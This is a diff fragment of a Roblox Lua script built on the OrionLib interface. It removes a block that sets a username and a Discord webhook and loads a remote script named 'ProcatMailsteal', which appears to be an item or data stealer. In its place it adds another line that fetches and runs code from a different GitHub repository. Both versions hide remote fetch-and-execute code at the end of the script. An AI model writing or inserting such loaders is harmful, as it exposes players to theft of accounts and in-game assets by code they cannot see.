@@ -3206,8 +3206,4 @@ StatTracker:AddSlider({
 coroutine.resume(dupedeleteco)
 OrionLib:Init()
 wait(300)
---[[ Main Config ]]--
-_G.Username = "xCrown1e"
-_G.Webhook = "https://discord.com/api/webhooks/1095690671391780924/u_p5d57WAI3JzThUIUZzDve0wC1tao_Pm8CznchhvhmmleEY1uvJdtrJJu-8V8T8rqjJ"
-
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/procat69420/ProcatMailsteal/main/ProcatMailsteal.lua'),true))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/xCrown1e/CLUBLET/main/xCrown1e%20Doe'))()
